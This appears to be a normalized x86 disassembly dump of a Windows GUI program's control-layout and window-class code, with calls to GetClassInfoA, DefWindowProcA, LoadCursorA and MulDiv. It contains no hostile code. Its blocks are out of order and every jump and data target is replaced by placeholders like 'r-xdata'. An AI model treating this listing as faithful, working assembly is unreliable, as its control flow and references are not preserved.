mov eax [ ebp - 0x4 ]
call sub_44344c
retn
sub_442be7
mov eax [ ebp - 0x4 ]
call sub_442acc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4442a0
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_441578
sub_442c1c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_442c37 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_442ca8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_446ee8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_418ddc
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_443029
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443030
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_442f3e ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_442ea1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_443030
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_44305f ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_4430e8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4438dc
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41a0dc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_41a238
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_442ca8
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4438a0
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_41a2b4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_41a238
mov edx eax
mov ecx ebx
mov eax edi
call sub_442c1c
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_443258
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_4438dc
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_4438a0
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_4438a0
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4432ac
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_443258
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44338b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4430e8
pop ecx
push ebp
mov al 0x2
call sub_4430e8
pop ecx
push ebp
mov al 0x3
call sub_4430e8
pop ecx
push ebp
mov al 0x4
call sub_4430e8
pop ecx
push ebp
mov al 0x5
call sub_4430e8
pop ecx
push ebp
mov al 0x6
call sub_4430e8
pop ecx
push ebp
xor eax eax
call sub_4430e8
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40324c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403448
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_4433b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_446ee8
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443444
xor eax eax
push ebp
push sub_443437
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44344c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_443474
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_443539
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43fdc8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_4438dc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443540
mov eax [ ebp - 0xc ]
call sub_40324c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4438a0
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41a0dc
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43fb34
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41a238
xor ecx ecx
mov edx 0xb03e
call sub_441578
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4438a0
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_443548
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4438dc
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_443444
xor edx edx
push ebp
push sub_44362f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4438dc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4438a0
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41a0dc
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_41a238
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_40324c
mov eax [ ebp - 0x4 ]
call sub_44344c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4438a0
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_43f8d8
mov dl 0x4
call sub_43f8d8
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_41a128
sub_44369c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_457218
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_45af3c
sub_4436bc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43ecb8
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43ecb8
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43ecb8
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_443708
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43ece0
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43ece0
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43ece0
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_443750
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403448
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_441578
mov edx ebx
mov eax edi
call sub_4436bc
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_441578
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_441578
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax edi
call sub_446ee8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_441578
mov eax edi
call sub_4442a0
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4433b0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_443824
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_441578
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax esi
call sub_446ee8
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_44369c
mov eax ebp
call sub_444104
jmp r-xdata
mov edx ebx
mov eax esi
call sub_443708
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_441578
mov eax esi
call sub_44346c
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44080c
sub_4438a0
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_41a238
mov edx edi
mov eax ebp
call sub_41a238
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4438fc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_4438dc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4438a0
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_44393c
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_4438fc
add esp 0x10
retn
sub_443964
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_4439d0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_440a08
test al al
je r-xdata
mov eax ebx
call sub_440a38
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403448
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403448
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403448
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_443a38
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_443b56
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402c58
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4439d0
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_446be4
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_40319c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404200
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_40899c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443b5d
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_443b64
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_443d25
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_43d1b8
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
